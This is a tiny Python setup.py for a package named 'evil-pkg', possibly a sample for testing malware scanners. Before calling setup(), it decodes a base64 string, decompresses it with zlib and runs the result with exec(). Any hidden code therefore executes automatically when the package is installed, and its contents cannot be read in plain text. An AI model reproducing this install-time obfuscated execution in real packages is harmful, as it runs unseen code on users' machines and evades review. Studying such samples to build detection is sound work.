import zlib, base64
from setuptools import setup
data = base64.b64decode('eJxLSSxJVUjMS8tMBQCEeQKk')
exec(zlib.decompress(data))
setup(name="evil-pkg", version="1.0.0")
